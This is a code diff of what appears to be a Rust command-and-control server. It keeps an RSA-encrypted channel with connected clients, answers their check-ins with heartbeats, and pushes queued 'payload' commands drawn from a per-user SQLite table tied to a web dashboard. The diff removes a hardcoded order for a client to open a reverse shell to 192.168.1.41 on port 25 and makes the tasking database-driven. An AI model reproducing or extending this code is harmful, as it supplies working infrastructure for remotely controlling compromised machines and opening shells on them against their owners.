@@ -11,8 +11,7 @@ use std::io;
 use serde::{Deserialize, Serialize};
 use rsa::{RsaPublicKey, RsaPrivateKey, pkcs8::FromPublicKey, pkcs8::ToPublicKey, PaddingScheme};
 use rand::rngs::OsRng;
-use rusqlite::{params, Connection, Result, NO_PARAMS};
-use std::fs;
+use rusqlite::{params, Connection, Result};
 use std::fs::File;
 
 #[cfg(test)]
@@ -36,6 +35,9 @@ struct User{
     _addr: std::net::SocketAddr, 
 }
 
+struct Payload{
+    payload: String,
+}
 
 #[derive(Serialize, Deserialize, Debug)]
 struct Message{
@@ -135,11 +137,8 @@ async fn db_process (channel_snd: Sender<String>, mut channel_rcv : Receiver<Str
     }
 }
 
-// message type : global
-// message type : login
-// message type : private
-// message type : get_from_db
-// message type : set_from_db
+// message type : heartbeat
+// message type : payload
 async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv : Receiver<String>, srv_priv_key: RsaPrivateKey, clt_pub_key: RsaPublicKey, mut rng: OsRng) {
     // data from database
     let message_back_from_db = Message{
@@ -171,15 +170,40 @@ async fn process (mut user : User, channel_snd : Sender<String>, mut channel_rcv
             Ok(n) => {
                 let dec_data = srv_priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &data[..n]).expect("failed to decrypt");
                 assert_ne!(&dec_data, &data[..n]);
-                let message_to_send = Message {
-                    user_sender: "Server".to_string(),
-                    user_receiver:"user".to_string(),
-                    message_type:  "payload".to_string(),
-                    message_content: "reverseshell 192.168.1.41 25".to_string(),
-                };
-                let json_message = serde_json::to_string(&message_to_send).unwrap();
-                let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
-                user.stream.write(&enc_data).await.unwrap();
+
+                let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
+                let mut stmt = conn.prepare("SELECT payload FROM user WHERE name = :name").unwrap();
+                let mut query = stmt.query_map([":name", &user.username], |row| {
+                    Ok(Payload {
+                        payload: row.get(0)?,
+                    })
+                }).unwrap();
+                let first_entry = query.next().unwrap();
+                let payload = first_entry.unwrap();
+
+                if payload.payload != ""{
+                    let message_to_send = Message {
+                        user_sender: "Server".to_string(),
+                        user_receiver: user.username.clone(),
+                        message_type:  "payload".to_string(),
+                        message_content: payload.payload,
+                    };
+                    let json_message = serde_json::to_string(&message_to_send).unwrap();
+                    let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
+                    user.stream.write(&enc_data).await.unwrap();
+                    conn.execute("UPDATE user SET payload = '' WHERE name = :name", [":name", &user.username]);
+                }
+                else {
+                    let message_to_send = Message {
+                        user_sender: "Server".to_string(),
+                        user_receiver: user.username.clone(),
+                        message_type:  "heartbeat".to_string(),
+                        message_content: "".to_string(),
+                    };
+                    let json_message = serde_json::to_string(&message_to_send).unwrap();
+                    let enc_data = clt_pub_key.encrypt(&mut rng, PaddingScheme::new_pkcs1v15_encrypt(), json_message.as_bytes()).unwrap();
+                    user.stream.write(&enc_data).await.unwrap();
+                }
             }
             Err(_e) => {}
         }
@@ -265,20 +289,19 @@ async fn main() -> io::Result<()> {
         
         let fp = "/var/www/Dashboard/gui/central/datasave.db";
         if !std::path::Path::new(fp).exists() {
-        println!("On crée la base");
-        File::create("/var/www/Dashboard/gui/central/datasave.db")?;
-        let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
-        
-        conn.execute(
-            "CREATE TABLE user (
-                id INTEGER PRIMARY KEY,
-                name TEXT,
-                ip TEXT,
-                autre TEXT,
-                payload TEXT );",NO_PARAMS,);
+            println!("On crée la base");
+            File::create("/var/www/Dashboard/gui/central/datasave.db")?;
+            let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
+            
+            conn.execute(
+                "CREATE TABLE user (
+                    id INTEGER PRIMARY KEY,
+                    name TEXT,
+                    ip TEXT,
+                    autre TEXT,
+                    payload TEXT );",[],);
         }
-        
-        
+
         let conn = Connection::open("/var/www/Dashboard/gui/central/datasave.db").unwrap();
         println!("{}, {}",user1.username,user1._addr);
         let socket_ddr: &str = &user1._addr.to_string();
